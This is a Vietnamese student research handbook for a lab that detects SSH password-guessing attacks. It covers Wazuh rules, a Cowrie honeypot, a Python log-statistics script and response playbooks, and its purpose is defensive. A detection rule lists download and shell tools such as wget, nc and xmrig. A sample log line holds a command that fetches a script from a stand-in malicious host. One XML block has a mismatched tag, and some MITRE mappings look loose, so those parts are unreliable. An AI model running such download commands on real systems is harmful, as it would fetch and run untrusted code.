# Sổ Tay Hướng Dẫn Toàn Diện: Hoàn Thành Đề Tài NCKH Sinh Viên (Nhóm 16)

- **Tên đề tài:** Phát hiện và ứng phó tấn công dò mật khẩu SSH trên máy chủ phòng thí nghiệm bằng SIEM mã nguồn mở
- **Mã đề tài trên hệ thống QLKH:** `2026003427` (Đợt đăng ký: 2026 - đợt 2)
- **Nhóm thực hiện (Nhóm 16 - Lớp D23CNTT04):** Chu Ngọc Long (`2324802010275` – Nhóm trưởng), Nguyễn Vương Hoàng Thịnh (`2324802010357`)
- **Giảng viên hướng dẫn:** ThS. Nguyễn Đình Thọ
- **Thời gian thực hiện:** 7 tháng (Tháng 11/2026 – Tháng 05/2027)

Tài liệu này tổng hợp đầy đủ **những thứ cần chuẩn bị**, **các bước triển khai kỹ thuật kèm mã nguồn**, **quy trình thu thập dữ liệu 4 tuần**, **cách chạy diễn tập đo MTTD/MTTC** và **cấu trúc viết cuốn Báo cáo tổng kết** bám sát 100% Thuyết minh đề cương đã nộp.

## 1. Tổng Quan Những Cái Cần Có (Checklist Đầu Vào & Đầu Ra)

Để hoàn thành trọn vẹn đề tài từ lúc duyệt đề cương đến khi nghiệm thu cuối kỳ, nhóm cần chuẩn bị **3 nhóm điều kiện đầu vào** và bàn giao **6 sản phẩm đầu ra** (3 sản phẩm ứng dụng + 3 sản phẩm khoa học).

### 1.1. Những thứ cần chuẩn bị về hạ tầng (Lab & Cloud)

| Thành phần hạ tầng | Cấu hình tối thiểu khuyến nghị | Vai trò trong đề tài | Ghi chú triển khai thực tế |
| :--- | :--- | :--- | :--- |
| **Máy chủ giám sát trung tâm (Wazuh SIEM)** | Ubuntu Server 22.04/24.04 LTS, 4 vCPU, 8 GB RAM, 50 GB SSD | Chạy [Wazuh Server, Indexer và Dashboard](https://documentation.wazuh.com/current/user-manual/capabilities/active-response/index.html) (cổng TCP `1514`, `1515`, `443`) | Có thể dựng trên máy chủ vật lý phòng lab, VMware/Proxmox hoặc VPS nội bộ; đặt IP tĩnh (ví dụ `192.168.10.10`) |
| **Máy chủ phòng thí nghiệm đích (Target Lab Host)** | Ubuntu Server 22.04/24.04 LTS, 2 vCPU, 4 GB RAM, 30 GB SSD, **có IP Public** (hoặc NAT port 22 từ router/VPS) | Chạy OpenSSH quản trị thực (cổng `2222` + 2FA), Docker chứa [Cowrie Honeypot](https://github.com/cowrie/cowrie) (hứng cổng `22`), [Fail2ban](https://github.com/fail2ban/fail2ban/security) và Wazuh Agent | Để thu được **4 tuần dữ liệu thực tế từ Internet**, máy này (hoặc 1 VPS giá rẻ/sinh viên trên Azure/AWS/GCP) cần mở cổng `TCP 22` ra Internet vào container Cowrie |
| **Máy tấn công diễn tập (Attacker Node)** | Kali Linux (2 vCPU, 4 GB RAM) đặt trong cùng mạng LAN phòng lab | Chạy 4 kịch bản diễn tập ([THC Hydra](https://github.com/vanhauser-thc/thc-hydra?ref=error.ch), Medusa, Python Low-and-Slow, Post-Exploitation) để đo MTTD và MTTC | Chỉ tấn công trong mạng nội bộ phòng lab vào máy đích khi làm diễn tập Chương 4 |
| **Điện thoại cá nhân của nhóm** | Cài ứng dụng Google Authenticator hoặc Authy | Quét mã QR sinh mã TOTP 6 chữ số theo chuẩn [RFC 6238](https://www.rfc-editor.org/rfc/rfc6238) khi đăng nhập SSH cổng `2222` | Dùng để minh họa cơ chế xác thực hai yếu tố theo kiến trúc [NIST SP 800-207 Zero Trust](https://nvlpubs.nist.gov/nistpubs/specialpublications/NIST.SP.800-207.pdf) |

### 1.2. Checklist 6 sản phẩm bắt buộc phải có khi nghiệm thu

- [ ] **Sản phẩm ứng dụng (a) – Hệ thống giám sát triển khai trên máy chủ phòng thí nghiệm:** Cụm Wazuh SIEM hoạt động, Agent kết nối `Active`, Cowrie Honeypot chạy trong Docker nhận lưu lượng cổng `22`, Fail2ban chạy ở host, SSH thực chạy ở cổng `2222` bắt buộc `publickey + TOTP`, và tệp luật tùy biến `local_rules.xml` hoạt động.
- [ ] **Sản phẩm ứng dụng (b) – Gói dữ liệu Honeypot tối thiểu 4 tuần (28 ngày) & Script thống kê:** File log gốc `cowrie.json` thu thập liên tục $\ge 28$ ngày, thư mục mẫu mã độc thu giữ (hoặc danh sách hash SHA256), kèm script Python tự động xuất bảng thống kê nguồn và kiểu tấn công.
- [ ] **Sản phẩm ứng dụng (c) – Bộ mã nguồn 03 Playbook ứng phó & Kịch bản diễn tập:** 3 kịch bản Active Response (`firewall-drop`, `host-isolate.sh`, `forensic-triage.sh`), script tấn công diễn tập Low-and-Slow và script tính toán tự động chỉ số `MTTD`, `MTTC`.
- [ ] **Sản phẩm khoa học (1) – Cuốn Báo cáo tổng kết đề tài NCKH SV:** Trình bày theo chuẩn Trường Đại học Thủ Dầu Một (Mở đầu, 4 Chương, Kết luận, Tài liệu tham khảo, Phụ lục A/B/C).
- [ ] **Sản phẩm khoa học (2) – Báo cáo thống kê định lượng 4 tuần dữ liệu Honeypot:** Các bảng số liệu và biểu đồ phân tích lưu lượng theo tuần, Top IP/Quốc gia/ASN, Top Username/Password, chuỗi lệnh hậu khai thác (lồng ghép trong Chương 4 của Báo cáo tổng kết và xuất kèm file tổng hợp).
- [ ] **Sản phẩm khoa học (3) – Tài liệu đặc tả 03 Playbook chuẩn [NIST SP 800-61 Rev. 2](https://nvlpubs.nist.gov/nistpubs/specialpublications/nist.sp.800-61r2.pdf) & Báo cáo diễn tập:** Đặc tả chi tiết 4 giai đoạn cho từng playbook và bảng đo kiểm thực nghiệm $N = 15$ lần chạy cho 4 kịch bản tấn công (so sánh Thủ công vs. Tự động).

## 2. Hướng Dẫn Chi Tiết Làm Sản Phẩm (a): Xây Dựng Hệ Thống Giám Sát Đa Lớp

### Bước 2.1. Tăng cứng SSH quản trị thực theo tinh thần Zero Trust (Cổng 2222 + Ed25519 + 2FA TOTP)

Thực hiện trên **Máy chủ phòng thí nghiệm đích (Target Lab Host)** để bảo vệ kênh quản trị thực theo chuẩn [RFC 4251](https://www.rfc-editor.org/rfc/rfc4251.txt) trước khi mở bẫy ở cổng 22:

1. **Tạo khóa Ed25519 trên máy quản trị của bạn và đẩy lên máy chủ đích:**

```bash
# Chạy trên máy cá nhân của Long/Thịnh
ssh-keygen -t ed25519 -C "long-admin@tdmu-lab"
ssh-copy-id -i ~/.ssh/id_ed25519.pub ubuntu@<IP_MAY_CHU_LAB>
```

2. **Cài đặt mô-đun PAM Google Authenticator ([libpam-google-authenticator](https://github.com/google/google-authenticator-libpam)) trên máy chủ đích:**

```bash
sudo apt-get update && sudo apt-get install -y libpam-google-authenticator

# Chạy dưới tài khoản quản trị (không chạy sudo) để tạo mã QR TOTP
google-authenticator -t -d -f -r 3 -R 30 -W
```

*Lưu ý khi chạy lệnh trên:* Mở ứng dụng Google Authenticator trên điện thoại quét mã QR hiện trên màn hình terminal và **chụp màn hình lại** để đưa vào Chương 2 của báo cáo.

3. **Cấu hình `/etc/pam.d/sshd`:**
Mở tệp `/etc/pam.d/sshd`, thêm dòng sau vào cuối tệp và **vô hiệu hóa (comment `#`)** dòng `@include common-auth` nếu muốn không hỏi lại mật khẩu tĩnh mà chỉ hỏi Khóa SSH + Mã TOTP:

```ini
# Thêm vào cuối /etc/pam.d/sshd
auth required pam_google_authenticator.so nullok
```

4. **Chuyển cổng SSH thật sang `2222` và ép buộc xác thực đa yếu tố trong `/etc/ssh/sshd_config`:**

```ini
Port 2222
PermitRootLogin no
PubkeyAuthentication yes
PasswordAuthentication no
PermitEmptyPasswords no
KbdInteractiveAuthentication yes
ChallengeResponseAuthentication yes
UsePAM yes
AuthenticationMethods publickey,keyboard-interactive
MaxAuthTries 3
LoginGraceTime 30
```

Kiểm tra cấu hình và khởi động lại dịch vụ SSH:

```bash
sudo sshd -t && sudo systemctl restart ssh
```

> **Kiểm tra nghiệm thu Bước 2.1:** Mở một cửa sổ terminal mới và chạy `ssh -p 2222 ubuntu@<IP_MAY_CHU_LAB>`. Hệ thống phải kiểm tra khóa `id_ed25519` trước, sau đó hiện dòng nhắc `Verification code:` yêu cầu nhập 6 số TOTP trên điện thoại. Chụp ảnh màn hình phiên đăng nhập này để đưa vào báo cáo.

### Bước 2.2. Triển khai Cowrie Honeypot trong mạng cô lập Docker và chuyển hướng cổng 22

1. **Tạo thư mục lưu trữ bền vững và tệp `docker-compose.yml` cho [Cowrie Honeypot](https://docs.cowrie.org/en/latest/INSTALL.html):**

```bash
sudo mkdir -p /opt/cowrie/var/log/cowrie /opt/cowrie/var/lib/cowrie /opt/cowrie/etc
sudo chown -R 1000:1000 /opt/cowrie
```

Tạo tệp `/opt/cowrie/docker-compose.yml`:

```yaml
version: '3.8'
services:
  cowrie:
    image: cowrie/cowrie:latest
    container_name: cowrie_honeypot
    restart: always
    ports:
      - "2223:2222"
    volumes:
      - /opt/cowrie/var/log/cowrie:/cowrie/cowrie-git/var/log/cowrie
      - /opt/cowrie/var/lib/cowrie:/cowrie/cowrie-git/var/lib/cowrie
    networks:
      - honeypot_isolated_net
    read_only: false
    cap_drop:
      - ALL

networks:
  honeypot_isolated_net:
    driver: bridge
```

Khởi chạy container:

```bash
cd /opt/cowrie && sudo docker compose up -d
```

2. **Chuyển hướng toàn bộ lưu lượng cổng `TCP 22` vào cổng `2223` của Cowrie bằng `iptables`:**

```bash
# Chuyển tiếp lưu lượng từ bên ngoài gọi vào cổng 22 sang cổng 2223 của Cowrie
sudo iptables -t nat -A PREROUTING -p tcp --dport 22 -j REDIRECT --to-port 2223
# Cho phép chuyển tiếp trên chính localhost (phục vụ kiểm thử cục bộ)
sudo iptables -t nat -A OUTPUT -p tcp -d 127.0.0.1 --dport 22 -j REDIRECT --to-port 2223

# Lưu quy tắc iptables bền vững sau khi reboot
sudo apt-get install -y iptables-persistent
sudo netfilter-persistent save
```

### Bước 2.3. Cài đặt Fail2ban làm lớp ngắt mạch cục bộ cho cổng quản trị thực

Cài đặt [Fail2ban](https://github.com/fail2ban/fail2ban/security) để bảo vệ cổng SSH quản trị thực (`2222`), trong khi để cổng `22` (chuyển vào `2223`) cho Cowrie và Wazuh xử lý:

```bash
sudo apt-get install -y fail2ban
```

Tạo tệp `/etc/fail2ban/jail.local`:

```ini
[DEFAULT]
ignoreip = 127.0.0.1/8 ::1 192.168.10.0/24
bantime  = 1800
findtime = 600
maxretry = 5
backend  = systemd

[sshd]
enabled  = true
port     = 2222
logpath  = /var/log/auth.log
maxretry = 4
```

Khởi động lại Fail2ban:

```bash
sudo systemctl enable --now fail2ban
sudo fail2ban-client status sshd
```

### Bước 2.4. Kết nối Wazuh Agent và thu thập nhật ký `cowrie.json`

Trên **Máy chủ phòng thí nghiệm đích**, mở tệp cấu hình `/var/ossec/etc/ossec.conf` của Wazuh Agent và thêm khối `<localfile>` để đẩy nhật ký JSON của Cowrie về Wazuh Manager qua [bộ giải mã JSON của Wazuh](https://documentation.wazuh.com/current/user-manual/ruleset/decoders/json-decoder.html):

```xml
<ossec_config>
  <!-- Đảm bảo khối client trỏ đúng IP của Wazuh Manager -->
  <client>
    <server>
      <address>192.168.10.10</address>
      <port>1514</port>
      <protocol>tcp</protocol>
    </server>
  </client>

  <!-- Theo dõi nhật ký JSON của Cowrie Honeypot -->
  <localfile>
    <log_format>json</log_format>
    <location>/opt/cowrie/var/log/cowrie/cowrie.json</location>
  </localfile>

  <!-- Theo dõi nhật ký xác thực hệ thống thực -->
  <localfile>
    <log_format>syslog</log_format>
    <location>/var/log/auth.log</location>
  </localfile>
</ossec_config>
```

Khởi động lại Wazuh Agent:

```bash
sudo systemctl restart wazuh-agent
```

### Bước 2.5. Xây dựng bộ quy tắc phát hiện tự viết (`local_rules.xml`) trên Wazuh Manager

Trên **Máy chủ Wazuh Manager**, chỉnh sửa tệp `/var/ossec/etc/rules/local_rules.xml` theo tài liệu [Wazuh Custom Rules](https://documentation.wazuh.com/current/user-manual/ruleset/rules/custom.html) để bắt đầy đủ 4 hành vi: đăng nhập thất bại đơn lẻ ([MITRE T1110.001](https://attack.mitre.org/techniques/T1110/001/)), brute-force cường độ cao ([MITRE T1110](https://attack.mitre.org/techniques/T1110/)), dò mật khẩu tốc độ chậm ([MITRE T1110.003](https://attack.mitre.org/techniques/T1110/003/)), xâm nhập bẫy thành công ([MITRE T1078](https://attack.mitre.org/techniques/T1078/)) và thực thi lệnh hậu khai thác ([MITRE T1059](https://attack.mitre.org/techniques/T1059/)):

```xml
<!-- /var/ossec/etc/rules/local_rules.xml -->
<group name="cowrie,honeypot,">

  <!-- Rule nền tảng nhận diện bản ghi từ Cowrie JSON -->
  <rule id="100100" level="0">
    <decoded_as>json</decoded_as>
    <field name="data.eventid">^cowrie\.</field>
    <description>Cowrie: Bản ghi sự kiện nền tảng từ Honeypot</description>
  </rule>

  <!-- Phát hiện 1 lần đăng nhập thất bại vào Cowrie -->
  <rule id="100101" level="4">
    <if_sid>100100</if_sid>
    <field name="data.eventid">^cowrie\.login\.failed$</field>
    <description>Cowrie: Đăng nhập bẫy thất bại từ $(data.src_ip) [User: $(data.username)]</description>
    <mitre>
      <id>T1110.001</id>
    </mitre>
  </rule>

  <!-- Tương quan Brute-Force cường độ cao (>= 8 lần thất bại trong 60 giây) -->
  <rule id="100102" level="10" frequency="8" timeframe="60">
    <if_matched_sid>100101</if_matched_sid>
    <same_field>data.src_ip</same_field>
    <description>Cowrie: Phát hiện tấn công SSH Brute-Force cường độ cao từ $(data.src_ip)</description>
    <mitre>
      <id>T1110</id>
    </mitre>
  </rule>

  <!-- Tương quan tấn công dò mật khẩu tốc độ chậm Low-and-Slow (>= 6 lần trong 1800 giây) -->
  <rule id="100103" level="11" frequency="6" timeframe="1800">
    <if_matched_sid>100101</if_matched_sid>
    <same_field>data.src_ip</same_field>
    <description>Cowrie: Phát hiện tấn công dò mật khẩu SSH tốc độ chậm (Low-and-Slow) từ $(data.src_ip)</description>
    <mitre>
      <id>T1110.003</id>
    </mitre>
  </rule>

  <!-- Cảnh báo khi kẻ tấn công đăng nhập thành công vào Honeypot -->
  <rule id="100104" level="12">
    <if_sid>100100</if_sid>
    <field name="data.eventid">^cowrie\.login\.success$</field>
    <description>Cowrie CẢNH BÁO: Đăng nhập thành công vào honeypot từ $(data.src_ip) [User: $(data.username) / Pass: $(data.password)]</description>
    <mitre>
      <id>T1078</id>
    </mitre>
  </rule>

  <!-- Cảnh báo nguy cấp khi kẻ tấn công thực thi lệnh tải mã độc / mở shell -->
  <rule id="100105" level="14">
    <if_sid>100100</if_sid>
    <field name="data.eventid">^cowrie\.command\.input$</field>
    <field name="data.input">wget|curl|chmod|bash|sh|nc|ncat|python|xmrig|busybox</field>
    <description>Cowrie NGUY CẤP: Thực thi lệnh hậu khai thác nguy hiểm từ $(data.src_ip): $(data.input)</description>
    <mitre>
      <id>T1059.004</id>
    </mitre>
  </rule>

</group>

<group name="syslog,sshd,">

  <!-- Phát hiện dò mật khẩu tốc độ chậm vào dịch vụ OpenSSH thực tế (>= 5 lần trong 1200 giây) -->
  <rule id="100201" level="10" frequency="5" timeframe="1200">
    <if_matched_sid>5710</if_matched_sid>
    <same_source_ip />
    <description>SSHD Thực: Phát hiện dò mật khẩu tốc độ chậm (Low-and-Slow) từ $(srcip)</description>
    <mitre>
      <id>T1110.003</id>
    </mitre>
  </rule>

</group>
```

> **Mẹo kỹ thuật quan trọng:** Với log JSON của Cowrie, địa chỉ IP nằm ở trường động `data.src_ip`, nên dùng thẻ `<same_field>data.src_ip</same_field>` (hoặc ánh xạ `data.src_ip` sang `srcip` trong decoder) sẽ giúp Wazuh gom nhóm chính xác theo IP nguồn và truyền được IP đó xuống kịch bản Active Response.

Kiểm thử nhanh bộ quy tắc bằng công cụ `wazuh-logtest`:

```bash
sudo /var/ossec/bin/wazuh-logtest
# Dán thử 1 dòng JSON mẫu vào để kiểm tra Rule 100101 và 100105 nổ chính xác:
{"eventid":"cowrie.login.failed","src_ip":"203.0.113.50","username":"root","password":"123456","timestamp":"2026-12-01T08:00:01Z"}
{"eventid":"cowrie.command.input","src_ip":"203.0.113.50","input":"wget http://malicious.example/bot.sh -O /tmp/bot.sh","timestamp":"2026-12-01T08:01:00Z"}
```

## 3. Hướng Dẫn Chi Tiết Làm Sản Phẩm (b): Thu Thập 4 Tuần Dữ Liệu Honeypot & Script Thống Kê

### Bước 3.1. Duy trì thu thập dữ liệu liên tục 28 ngày (4 tuần)

- Để có dữ liệu thật đa dạng từ các botnet quốc tế, nhóm nên đặt container Cowrie trên một máy chủ có IP công khai (có thể dùng gói sinh viên miễn phí trên Azure for Students / AWS / GCP hoặc mở port forwarding cổng `22` tại phòng thí nghiệm) liên tục trong **tối thiểu 28 ngày** (theo tiến độ là từ giữa Tháng 01/2027 đến giữa Tháng 02/2027).
- Mỗi cuối tuần (Chủ nhật Tuần 1, Tuần 2, Tuần 3, Tuần 4), chạy lệnh sao lưu tệp `cowrie.json` để tránh mất dữ liệu:

```bash
cp /opt/cowrie/var/log/cowrie/cowrie.json* ~/backup_cowrie_week$(date +%U)/
```

### Bước 3.2. Kịch bản Python tự động thống kê dữ liệu Honeypot 4 tuần (`analyze_cowrie_4weeks.py`)

Lưu kịch bản dưới đây thành tệp `analyze_cowrie_4weeks.py` và chạy trực tiếp trên thư mục chứa `cowrie.json`. Kịch bản sẽ tự động xuất ra đúng các bảng thống kê mà bạn cần điền vào **Chương 4 (Mục 4.1 và 4.2)** của cuốn Báo cáo tổng kết:

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Kịch bản thống kê tự động dữ liệu 4 tuần từ Cowrie Honeypot (Sản phẩm b)

Cách chạy: python3 analyze_cowrie_4weeks.py
/opt/cowrie/var/log/cowrie/cowrie.json
"""

from collections import Counter, defaultdict
from datetime import datetime
import glob
import json
import sys


def parse_logs(file_pattern):
  total_sessions = set()
  failed_logins = 0
  success_logins = 0
  unique_ips = set()
  ip_counter = Counter()
  user_counter = Counter()
  pass_counter = Counter()
  cmd_counter = Counter()
  downloads = []
  weekly_stats = defaultdict(
      lambda: {
          "sessions": set(),
          "failed": 0,
          "success": 0,
          "ips": set(),
          "files": 0,
      }
  )

  for filepath in sorted(glob.glob(file_pattern)):
    with open(filepath, "r", encoding="utf-8", errors="ignore") as f:
      for line in f:
        line = line.strip()
        if not line:
          continue
        try:
          ev = json.loads(line)
        except json.JSONDecodeError:
          continue

        eventid = ev.get("eventid", "")
        src_ip = ev.get("src_ip")
        session = ev.get("session")
        ts_str = ev.get("timestamp", "")

        # Xác định tuần quan sát dựa trên ngày
        week_key = "Unknown"
        if ts_str:
          try:
            dt = datetime.fromisoformat(ts_str.replace("Z", "+00:00"))
            week_key = f"Năm {dt.year} - Tuần ISO {dt.isocalendar()[1]:02d}"
          except ValueError:
            pass

        if session:
          total_sessions.add(session)
          weekly_stats[week_key]["sessions"].add(session)
        if src_ip:
          unique_ips.add(src_ip)
          ip_counter[src_ip] += 1
          weekly_stats[week_key]["ips"].add(src_ip)

        if eventid == "cowrie.login.failed":
          failed_logins += 1
          weekly_stats[week_key]["failed"] += 1
          user_counter[ev.get("username", "")] += 1
          pass_counter[ev.get("password", "")] += 1
        elif eventid == "cowrie.login.success":
          success_logins += 1
          weekly_stats[week_key]["success"] += 1
          user_counter[ev.get("username", "")] += 1
          pass_counter[ev.get("password", "")] += 1
        elif eventid == "cowrie.command.input":
          cmd = ev.get("input", "").strip()
          if cmd:
            cmd_counter[cmd] += 1
        elif eventid == "cowrie.session.file_download":
          weekly_stats[week_key]["files"] += 1
          downloads.append({
              "url": ev.get("url", ""),
              "shasum": ev.get("shasum", ""),
              "outfile": ev.get("outfile", ""),
              "src_ip": src_ip,
          })

  print("=" * 75)
  print("1. BẢNG THỐNG KÊ TỔNG QUAN THEO TUẦN QUAN SÁT")
  print("=" * 75)
  print(
      f"{'Chu kỳ':<22} | {'Số phiên':>10} | {'Thất bại':>10} | {'Thành công':>10}"
      f" | {'Mẫu file':>8} | {'IP duy nhất':>11}"
  )
  print("-" * 75)
  for wk, st in sorted(weekly_stats.items()):
    print(
        f"{wk:<22} | {len(st['sessions']):>10} | {st['failed']:>10} |"
        f" {st['success']:>10} | {st['files']:>8} | {len(st['ips']):>11}"
    )
  print("-" * 75)
  print(
      f"{'TOÀN KỲ (TỔNG)':<22} | {len(total_sessions):>10} |"
      f" {failed_logins:>10} | {success_logins:>10} | {len(downloads):>8} |"
      f" {len(unique_ips):>11}"
  )

  print("\n2. TOP 10 TÀI KHOẢN (USERNAME) BỊ DÒ NHIỀU NHẤT:")
  for u, c in user_counter.most_common(10):
    print(f"  - {u or '<rỗng>'}: {c} lượt")

  print("\n3. TOP 10 MẬT KHẨU (PASSWORD) BỊ THỬ NHIỀU NHẤT:")
  for p, c in pass_counter.most_common(10):
    print(f"  - {p or '<rỗng>'}: {c} lượt")

  print("\n4. TOP 10 ĐỊA CHỈ IP NGUỒN TẤN CÔNG NHIỀU NHẤT:")
  for ip, c in ip_counter.most_common(10):
    # Che octet cuối khi xuất báo cáo công khai theo mục 11.2 của đề cương
    masked_ip = ".".join(ip.split(".")[:3] + ["xxx"]) if "." in ip else ip
    print(f"  - {ip} (Báo cáo: {masked_ip}): {c} sự kiện")

  print("\n5. TOP 10 LỆNH HẬU KHAI THÁC (POST-EXPLOITATION COMMANDS):")
  for cmd, c in cmd_counter.most_common(10):
    print(f"  - [{c} lần] {cmd[:80]}")

  print(f"\n6. MẪU TỆP ĐỘC HẠI THU GIỮ ({len(downloads)} lượt tải):")
  seen_hashes = set()
  for d in downloads:
    if d["shasum"] and d["shasum"] not in seen_hashes:
      seen_hashes.add(d["shasum"])
      print(f"  - SHA256: {d['shasum']} | Nguồn: {d['url']}")


if __name__ == "__main__":
  pattern = (
      sys.argv[1]
      if len(sys.argv) > 1
      else "/opt/cowrie/var/log/cowrie/cowrie.json*"
  )
  parse_logs(pattern)
```

## 4. Hướng Dẫn Chi Tiết Làm Sản Phẩm (c): 03 Playbook Ứng Phó & Diễn Tập Đo MTTD, MTTC

### Bước 4.1. Hiện thực hóa 3 kịch bản Active Response trên máy chủ phòng thí nghiệm

Theo hướng dẫn [Wazuh Custom Active Response Scripts](https://documentation.wazuh.com/current/user-manual/capabilities/active-response/custom-active-response-scripts.html), mọi kịch bản đặt tại `/var/ossec/active-response/bin/` trên **Máy chủ phòng thí nghiệm đích (Agent)** phải thuộc quyền sở hữu `root:wazuh` và chế độ `0750`.

1. **Kịch bản Playbook 1 – Chặn IP nguồn có thời hạn (`firewall-drop`):**
Sử dụng kịch bản `/var/ossec/active-response/bin/firewall-drop` tích hợp sẵn của Wazuh (hoặc kiểm tra gói `jq` đã cài trên Agent bằng `sudo apt-get install -y jq`).

2. **Kịch bản Playbook 2 – Cô lập mạng máy chủ nhưng bảo lưu kênh điều khiển SIEM (`host-isolate.sh`):**
Tạo tệp `/var/ossec/active-response/bin/host-isolate.sh` trên máy chủ đích:

```bash
#!/bin/bash
# Playbook 2: Cô lập mạng máy chủ nhưng giữ kết nối TCP 1514, 1515 về Wazuh Manager
LOG_FILE="/var/ossec/logs/active-responses.log"
MANAGER_IP="192.168.10.10" # Thay bằng IP thực của Wazuh Manager trong phòng lab

read -r INPUT_JSON
COMMAND=$(echo "$INPUT_JSON" | jq -r '.command')
RULE_ID=$(echo "$INPUT_JSON" | jq -r '.parameters.alert.rule.id')

log_msg() {
    echo "$(date -u '+%Y-%m-%dT%H:%M:%S.%3NZ') [host-isolate] [Rule:$RULE_ID] $1" >> "$LOG_FILE"
}

if [ "$COMMAND" = "add" ]; then
    log_msg "START_ISOLATION: Kích hoạt cô lập mạng, bảo lưu kênh SIEM tới $MANAGER_IP"

    iptables -N ISOLATION_CHAIN 2>/dev/null
    iptables -F ISOLATION_CHAIN

    # 1. Cho phép giao diện loopback nội bộ
    iptables -A ISOLATION_CHAIN -i lo -j ACCEPT
    iptables -A ISOLATION_CHAIN -o lo -j ACCEPT

    # 2. Bảo lưu kết nối 2 chiều với Wazuh Manager trên cổng 1514, 1515
    iptables -A ISOLATION_CHAIN -d "$MANAGER_IP" -p tcp -m multiport --dports 1514,1515 -j ACCEPT
    iptables -A ISOLATION_CHAIN -s "$MANAGER_IP" -p tcp -m multiport --sports 1514,1515 -j ACCEPT

    # 3. Chặn toàn bộ lưu lượng mạng còn lại
    iptables -A ISOLATION_CHAIN -j DROP

    # Chèn lên đầu bảng INPUT và OUTPUT nếu chưa có
    iptables -C INPUT -j ISOLATION_CHAIN 2>/dev/null || iptables -I INPUT 1 -j ISOLATION_CHAIN
    iptables -C OUTPUT -j ISOLATION_CHAIN 2>/dev/null || iptables -I OUTPUT 1 -j ISOLATION_CHAIN

    log_msg "MITIGATED: Đã cô lập hoàn toàn máy chủ mạng (giữ kênh 1514/1515)."

elif [ "$COMMAND" = "delete" ]; then
    iptables -D INPUT -j ISOLATION_CHAIN 2>/dev/null
    iptables -D OUTPUT -j ISOLATION_CHAIN 2>/dev/null
    iptables -F ISOLATION_CHAIN 2>/dev/null
    iptables -X ISOLATION_CHAIN 2>/dev/null
    log_msg "RECOVERED: Đã gỡ bỏ trạng thái cô lập máy chủ."
fi

exit 0
```

3. **Kịch bản Playbook 3 – Thu thập chứng cứ số khả biến tức thì kèm băm SHA256 (`forensic-triage.sh`):**
Tạo tệp `/var/ossec/active-response/bin/forensic-triage.sh` trên máy chủ đích:

```bash
#!/bin/bash
# Playbook 3: Thu thập nhanh chứng cứ khả biến (Volatile Forensics) và băm toàn vẹn SHA256
LOG_FILE="/var/ossec/logs/active-responses.log"
read -r INPUT_JSON
COMMAND=$(echo "$INPUT_JSON" | jq -r '.command')
RULE_ID=$(echo "$INPUT_JSON" | jq -r '.parameters.alert.rule.id')

if [ "$COMMAND" != "add" ]; then
    exit 0
fi

TIMESTAMP=$(date -u '+%Y%m%d_%H%M%S')
EVIDENCE_DIR="/var/log/forensics_evidence"
WORK_DIR="/tmp/triage_$TIMESTAMP"
ARCHIVE="$EVIDENCE_DIR/triage_$TIMESTAMP.tar.gz"

mkdir -p "$EVIDENCE_DIR" "$WORK_DIR"
chmod 700 "$EVIDENCE_DIR"

# Trích xuất các thông tin khả biến trong bộ nhớ và hệ thống
ss -tulpn > "$WORK_DIR/listening_sockets.txt" 2>&1
ss -antp > "$WORK_DIR/established_connections.txt" 2>&1
ps auxwwf > "$WORK_DIR/process_tree.txt" 2>&1
who -a > "$WORK_DIR/active_sessions.txt" 2>&1
last -n 50 > "$WORK_DIR/recent_logins.txt" 2>&1
cp /root/.bash_history "$WORK_DIR/root_history.txt" 2>/dev/null
ls -la /tmp /var/tmp /dev/shm > "$WORK_DIR/volatile_directories.txt" 2>&1
echo "$INPUT_JSON" > "$WORK_DIR/trigger_alert.json"

# Đóng gói và tạo mã băm SHA256
tar -czf "$ARCHIVE" -C "$WORK_DIR" .
rm -rf "$WORK_DIR"
sha256sum "$ARCHIVE" > "$ARCHIVE.sha256"

echo "$(date -u '+%Y-%m-%dT%H:%M:%S.%3NZ') [forensic-triage] [Rule:$RULE_ID] MITIGATED: Đã đóng gói chứng cứ tại $ARCHIVE (SHA256 verified)" >> "$LOG_FILE"
exit 0
```

Cấp quyền thực thi chuẩn cho cả hai kịch bản trên Agent:

```bash
sudo chown root:wazuh /var/ossec/active-response/bin/host-isolate.sh /var/ossec/active-response/bin/forensic-triage.sh
sudo chmod 750 /var/ossec/active-response/bin/host-isolate.sh /var/ossec/active-response/bin/forensic-triage.sh
```

4. **Khai báo `<command>` và `<active-response>` trong `/var/ossec/etc/ossec.conf` trên Wazuh Manager:**

```xml
<!-- Thêm vào /var/ossec/etc/ossec.conf trên Wazuh Manager -->
<ossec_config>
  <!-- Danh sách trắng không bao giờ bị chặn: IP localhost, IP Manager, IP máy quản trị -->
  <global>
    <white_list>127.0.0.1</white_list>
    <white_list>192.168.10.10</white_list>
    <white_list>192.168.10.50</white_list>
  </global>

  <!-- Khai báo 3 lệnh tương ứng 3 Playbook -->
  <command>
    <name>pb1-firewall-drop</name>
    <executable>firewall-drop</executable>
    <timeout_allowed>yes</timeout_allowed>
  </command>

  <command>
    <name>pb2-host-isolate</name>
    <executable>host-isolate.sh</executable>
    <timeout_allowed>yes</timeout_allowed>
  </command>

  <command>
    <name>pb3-forensic-triage</name>
    <executable>forensic-triage.sh</executable>
    <timeout_allowed>no</timeout_allowed>
  </command>

  <!-- Playbook 1: Chặn IP nguồn trong 3600s khi nổ Rule 100102, 100103, 100201 -->
  <active-response>
    <command>pb1-firewall-drop</name>
    <location>local</location>
    <rules_id>100102,100103,100201</rules_id>
    <timeout>3600</timeout>
  </active-response>

  <!-- Playbook 2: Cô lập mạng máy chủ khi nổ Rule 100105 (Thực thi lệnh nguy hiểm) -->
  <active-response>
    <command>pb2-host-isolate</command>
    <location>local</location>
    <rules_id>100105</rules_id>
    <timeout>1800</timeout>
  </active-response>

  <!-- Playbook 3: Thu thập chứng cứ khả biến khi nổ Rule 100104 hoặc 100105 -->
  <active-response>
    <command>pb3-forensic-triage</command>
    <location>local</location>
    <rules_id>100104,100105</rules_id>
  </active-response>
</ossec_config>
```

Khởi động lại Wazuh Manager:

```bash
sudo systemctl restart wazuh-manager
```

### Bước 4.2. Tổ chức diễn tập 4 kịch bản ($N = 15$ lần/kịch bản) và đo MTTD, MTTC

Trước khi bấm giờ diễn tập, bắt buộc đồng bộ thời gian NTP trên cả 3 máy (Kali Linux, Target Lab Host, Wazuh Manager) để sai số đồng hồ $< 10\text{ ms}$:

```bash
sudo apt-get install -y chrony
sudo chronyc makestep
chronyc tracking
```

